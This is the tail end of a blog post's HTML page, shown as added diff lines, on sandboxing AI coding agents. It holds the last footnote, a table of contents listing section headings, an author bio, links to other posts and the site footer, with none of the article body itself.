+<li id="fn:21">
+<p>Canarytokens documentation, AWS keys token: <a href="https://docs.canarytokens.org/guide/aws-keys-token.html" rel="noopener noreferrer" target="_blank">https://docs.canarytokens.org/guide/aws-keys-token.html</a>.&#160;<a href="#fnref:21" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+      </div>
+      
+    </div>
+    
+      <aside class="post-aside">
+        
+          <nav class="toc" aria-label="On this page" data-toc>
+            <p class="toc-title"><span>On this page</span></p>
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#one-flag-and-the-agent-stops-asking">One flag, and the agent stops asking</a></li>
+    <li><a href="#the-lethal-trifecta">The lethal trifecta</a></li>
+    <li><a href="#this-has-already-happened">This has already happened</a></li>
+    <li><a href="#a-permission-prompt-is-not-a-wall">A permission prompt is not a wall</a></li>
+    <li><a href="#what-a-sandbox-has-to-limit">What a sandbox has to limit</a></li>
+    <li><a href="#where-to-run-it">Where to run it</a>
+      <ul>
+        <li><a href="#option-1-the-local-os-sandbox">Option 1: the local OS sandbox</a></li>
+        <li><a href="#option-2-docker">Option 2: Docker</a></li>
+        <li><a href="#option-3-a-vm">Option 3: a VM</a></li>
+        <li><a href="#option-4-a-cicd-runner">Option 4: a CI/CD runner</a></li>
+        <li><a href="#option-5-kubernetes">Option 5: Kubernetes</a></li>
+        <li><a href="#all-five-side-by-side">All five, side by side</a></li>
+      </ul>
+    </li>
+    <li><a href="#a-sandbox-is-not-the-whole-answer">A sandbox is not the whole answer</a>
+      <ul>
+        <li><a href="#monitor">Monitor</a></li>
+        <li><a href="#canary">Canary</a></li>
+      </ul>
+    </li>
+    <li><a href="#demo-a-poisoned-dependency">Demo: a poisoned dependency</a>
+      <ul>
+        <li><a href="#run-1-the-flag-sandbox-off">Run 1: the flag, sandbox off</a></li>
+        <li><a href="#run-2-no-flag-sandbox-on">Run 2: no flag, sandbox on</a></li>
+        <li><a href="#why-this-works">Why this works</a></li>
+      </ul>
+    </li>
+    <li><a href="#five-things-to-do-tomorrow">Five things to do tomorrow</a></li>
+  </ul>
+</nav>
+          </nav>
+        
+        
+          <div class="aside-box">
+            <p class="aside-box-head">
+              <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+              <span>Written by Roald Nefs</span>
+            </p>
+            <p>CTO at Warpnet and Enlite, working across security, platform engineering and AI. I co-organize BSides Groningen and run hands-on workshops on automotive security and hardware hacking.</p>
+            <a class="btn btn--sm" href="/training/#book-a-session">Book a workshop</a>
+          </div>
+        
+      </aside>
+    
+  </div>
+</article>
+
+
+  
+  <section class="more">
+    <div class="carousel" data-carousel>
+  <div class="container carousel-head">
+    <div>
+      <p class="eyebrow">Keep reading</p>
+      <h2 class="section-title">More posts</h2>
+    </div>
+    <div class="carousel-arrows">
+      <button type="button" data-carousel-prev aria-label="Previous posts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M23 12H1m0 0 6-6m-6 6 6 6"/></svg></button>
+      <button type="button" data-carousel-next aria-label="Next posts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M1 12h22m0 0-6-6m6 6-6 6"/></svg></button>
+    </div>
+  </div>
+  <div class="container">
+    <div class="carousel-track" data-carousel-track tabindex="0" role="group" aria-label="More posts">
+      
+        <a class="card" href="/posts/2026/01/building-a-car-hacking-test-bench/">
+  <span class="card-media">
+    <img src="/covers/building-a-car-hacking-test-bench.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        <span class="label label--primary">Featured</span>
+        <span class="label">Automotive</span>
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">Building a Car Hacking Test Bench</h3>
+    <span class="card-summary">Modern cars are computers on wheel, dozens of ECUs, multiple busses, wireless interfaces, and a threat model that keeps expanding. For the past few years I …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2026-01-04">January 4, 2026</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+        <a class="card" href="/posts/2024/12/how-to-extract-an-appimage-and-add-it-to-the-ubuntu-sidebar/">
+  <span class="card-media">
+    <img src="/covers/how-to-extract-an-appimage-and-add-it-to-the-ubuntu-sidebar.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        <span class="label label--primary">Featured</span>
+        
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">How to extract an AppImage and add it to the Ubuntu Sidebar</h3>
+    <span class="card-summary">In this post, we&rsquo;ll guide you through extracting an AppImage and integrating it into the Ubuntu sidebar for easy access. As an example, we&rsquo;ll use …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2024-12-25">December 25, 2024</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+        <a class="card" href="/posts/2024/01/committing-changes-to-a-pull-request-branch-created-from-a-fork/">
+  <span class="card-media">
+    <img src="/covers/committing-changes-to-a-pull-request-branch-created-from-a-fork.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        <span class="label label--primary">Featured</span>
+        <span class="label">Information security</span>
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">Committing Changes to a Pull Request Branch Created from a Fork</h3>
+    <span class="card-summary">Sometimes a pull request on GitHub.com needs some work before it can be merged into the project but you don&rsquo;t want to force the required work on the pull …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2024-01-03">January 3, 2024</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+        <a class="card" href="/posts/2022/11/spoofing-microchips-used-for-animal-identification/">
+  <span class="card-media">
+    <img src="/covers/spoofing-microchips-used-for-animal-identification.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        <span class="label label--primary">Featured</span>
+        <span class="label">Information security</span>
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">Spoofing Microchips used for Animal Identification</h3>
+    <span class="card-summary">A microchip implanted under the skin of an animal can be used for identification purposes. The microchips are using Radio Frequency Identification (RFID) …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2022-11-30">November 30, 2022</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+        <a class="card" href="/posts/2020/12/how-to-automatically-generate-clients-for-your-rest-api/">
+  <span class="card-media">
+    <img src="/covers/how-to-automatically-generate-clients-for-your-rest-api.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        <span class="label label--primary">Featured</span>
+        <span class="label">Software engineering</span>
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">How to Automatically Generate Clients for your REST API</h3>
+    <span class="card-summary">While helping a colleague with adding some code to the bunq Python SDK to allow him to retrieve some additional information from the API (bunq/sdk_python#148), …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2020-12-19">December 19, 2020</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+        <a class="card" href="/posts/2020/05/git-branching/">
+  <span class="card-media">
+    <img src="/covers/git-branching.svg" alt="" width="1600" height="900" loading="lazy">
+    
+      <span class="card-tags">
+        
+        <span class="label">Software engineering</span>
+      </span>
+    
+  </span>
+  <span class="card-body">
+    <h3 class="card-title">Git Branching</h3>
+    <span class="card-summary">Introduction Like other version control systems Git also support a way to diverge from the main line of development and continue to do work without messing with …</span>
+    <span class="author">
+  <img class="author-avatar" src="/images/authors/roald-nefs-avatar.webp" alt="" width="135" height="180" loading="lazy">
+  <span class="author-text">
+    <span class="author-name">Roald Nefs</span>
+    <time datetime="2020-05-10">May 10, 2020</time>
+  </span>
+</span>
+
+  </span>
+</a>
+
+      
+    </div>
+  </div>
+</div>
+
+  </section>
+
+
+  </main>
+  <footer class="site-footer">
+  <div class="container site-footer-inner">
+    <div class="footer-brand">
+      <a class="wordmark" href="/">Roald Nefs</a>
+      <ul class="footer-follow">
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/roaldnefs" rel="me noopener" target="_blank"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .3a12 12 0 0 0-3.8 23.38c.6.12.83-.26.83-.57v-2c-3.33.73-4.03-1.6-4.03-1.6-.55-1.38-1.33-1.75-1.33-1.75-1.08-.74.08-.73.08-.73 1.2.08 1.83 1.23 1.83 1.23 1.08 1.83 2.8 1.3 3.5 1 .1-.78.42-1.3.77-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.3.47-2.38 1.23-3.22-.12-.3-.54-1.52.12-3.18 0 0 1-.32 3.3 1.23a11.4 11.4 0 0 1 6 0c2.3-1.55 3.3-1.23 3.3-1.23.66 1.66.24 2.88.12 3.18.77.84 1.23 1.92 1.23 3.22 0 4.6-2.8 5.63-5.47 5.92.42.36.82 1.1.82 2.22v3.3c0 .32.22.7.83.58A12 12 0 0 0 12 .3"/></svg><span>GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/roaldnefs/" rel="me noopener" target="_blank"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.03-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.95v5.66H9.35V9h3.42v1.56h.05c.48-.9 1.64-1.85 3.37-1.85 3.6 0 4.27 2.37 4.27 5.46v6.28zM5.34 7.43a2.07 2.07 0 1 1 0-4.13 2.07 2.07 0 0 1 0 4.13zM7.12 20.45H3.56V9h3.56v11.45zM22.22 0H1.77C.8 0 0 .77 0 1.72v20.56C0 23.23.8 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.72V1.72C24 .77 23.2 0 22.22 0z"/></svg><span>LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://infosec.exchange/@roald" rel="me noopener" target="_blank"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M23.27 5.32c-.36-2.67-2.7-4.78-5.5-5.19C17.3.06 15.48 0 12.14 0h-.03c-3.34 0-4.05.06-4.52.13-2.72.4-5.18 2.3-5.77 5-.28 1.33-.31 2.8-.26 4.15.07 1.95.08 3.89.26 5.83.12 1.28.33 2.56.6 3.82.5 2.33 2.83 4.27 5.11 5.06 2.45.85 5.08.99 7.61.4.28-.06.55-.14.82-.23.6-.2 1.3-.42 1.81-.8a.06.06 0 0 0 .03-.05v-1.76a.05.05 0 0 0-.07-.05c-1.57.37-3.18.56-4.8.56-2.78 0-3.53-1.32-3.74-1.87a5.76 5.76 0 0 1-.33-1.5.05.05 0 0 1 .06-.05c1.55.37 3.13.56 4.72.56.38 0 .76 0 1.14-.01 1.6-.04 3.28-.13 4.85-.43.04 0 .08-.01.11-.02 2.48-.48 4.84-1.97 5.08-5.74.01-.15.04-1.56.04-1.71.01-.53.18-3.74-.03-5.7zm-3.9 9.46h-2.42V8.9c0-1.24-.52-1.87-1.56-1.87-1.15 0-1.72.74-1.72 2.22v3.2h-2.4v-3.2c0-1.47-.58-2.22-1.73-2.22-1.04 0-1.56.63-1.56 1.87v5.88H5.56V8.72c0-1.23.31-2.22.94-2.94.65-.72 1.5-1.1 2.56-1.1 1.22 0 2.15.47 2.77 1.4l.6 1.01.6-1.01c.63-.93 1.55-1.4 2.77-1.4 1.05 0 1.9.38 2.56 1.1.63.72.94 1.71.94 2.94v6.06z"/></svg><span>Mastodon</span></a></li>
+          
+        
+        <li><a href="/rss.xml"><svg role="img" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415a3.3 3.3 0 1 1 0 6.591 3.3 3.3 0 0 1 0-6.591zM15.502 24h-4.533c0-6.05-4.918-10.967-10.969-10.967V8.5c8.546 0 15.502 6.954 15.502 15.5z"/></svg><span>RSS</span></a></li>
+      </ul>
+    </div>
+    <div class="footer-cols">
+      <nav class="footer-col" aria-label="Pages">
+        <h2 class="footer-heading">Pages</h2>
+        <ul class="footer-links">
+          
+            
+          
+            
+              
+              <li><a href="/posts/" aria-current="page">Blog</a></li>
+            
+          
+            
+              
+              <li><a href="/training/">Training</a></li>
+            
+          
+            
+              
+              <li><a href="/tools/">Tools</a></li>
+            
+          
+            
+              
+              <li><a href="/about/">About</a></li>
+            
+          
+            
+          
+            
+          
+            
+          
+        </ul>
+      </nav>
+      <div class="footer-col">
+        <h2 class="footer-heading">Companies</h2>
+        <ul class="footer-links">
+          
+            <li><a href="https://warpnet.nl" rel="noopener noreferrer" target="_blank">Warpnet</a></li>
+          
+            <li><a href="https://enlite.nl" rel="noopener noreferrer" target="_blank">Enlite</a></li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h2 class="footer-heading">Agents</h2>
+        <ul class="footer-links">
+          <li><a href="/rss.xml">rss.xml</a></li>
+          <li><a href="/sitemap.md">sitemap.md</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h2 class="footer-heading">Legal</h2>
+        <ul class="footer-links">
+          <li><a href="/privacy/">Privacy</a></li>
+          <li><a href="/cookies/">Cookies</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="container site-footer-note">© 2026 Roald Nefs</div>
+</footer>
+
+</body>
+</html>
